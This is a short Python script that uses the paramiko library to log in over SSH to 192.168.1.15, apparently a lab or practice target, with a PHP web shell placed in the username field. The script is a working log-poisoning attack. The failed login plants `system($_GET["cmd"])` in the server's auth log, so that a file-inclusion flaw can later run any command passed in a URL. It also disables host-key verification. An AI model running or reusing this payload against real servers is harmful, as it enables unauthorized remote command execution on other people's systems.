import warnings
from cryptography.utils import CryptographyDeprecationWarning
# Suppress deprecation warnings before importing paramiko
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

import paramiko

# Create an SSH client
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# Connect to the server
try:
    ssh.connect("192.168.1.15", username='<?php system($_GET["cmd"]); ?>', password="")
    print("Connected successfully!")
except Exception as e:
    print(f"Connection failed: {e}")

finally:
    ssh.close()